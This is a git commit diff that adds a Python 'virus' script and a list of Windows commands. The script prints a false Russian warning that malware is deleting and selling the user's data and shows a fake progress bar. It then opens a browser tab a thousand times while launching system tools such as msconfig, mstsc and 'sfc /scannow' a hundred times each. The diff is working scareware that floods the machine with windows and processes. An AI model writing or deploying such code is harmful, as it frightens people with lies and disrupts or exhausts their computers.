3d594942c7985a180d8b93bb731fc648cf6054b3
TypeError <150837656+asdf1113k@users.noreply.github.com>
2025-12-16 09:51:03 +0300

    Add files via upload

---
+++ type_virus/list_command.py
@@ -0,0 +1,11 @@
+list_command = ['explorer.exe',
+'msconfig.exe',
+'msinfo32.exe',
+'cleanmgr.exe',
+'mstsc.exe',
+'charmap.exe',
+'eventvwr.msc',
+'ncpa.cpl',
+'appwiz.cpl',
+'sfc /scannow',
+'ipconfig']
---
+++ type_virus/virus.py
@@ -0,0 +1,41 @@
+import time
+import progressbar
+import os
+import webbrowser
+import threading
+from list_virus import list_virus
+from list_command import list_command
+
+
+def removal_process():
+    print("ЗАПУСК ВРЕДОНОСНЫХ ПРОГРАМм ДЛЯ УДАЛЕНИЯ И ПРОДаЖИ ВАШИХ ДАННЫХ")
+    time.sleep(1)
+
+    bar = progressbar.ProgressBar(max_value=66)
+    for index in range(len(list_virus)):
+        time.sleep(0.03)
+        try:
+            print(list_virus[index])
+        except IndexError:
+            pass
+        bar.update(index)
+    else:
+        for count in range(1000): # сколько раз открыть браузер
+            webbrowser.open("wwwww.jodi.org", new=2, autoraise=True)
+
+
+def open_windows():
+    for count in range(100): # !!! range(100)
+        for index in range(len(list_command)):
+            os.system(list_command[index])
+
+
+if __name__ == '__main__':
+    thread1 = threading.Thread(target=removal_process)
+    thread2 = threading.Thread(target=open_windows)
+
+    thread1.start()
+    thread2.start()
+
+    thread1.join()
+    thread2.join()
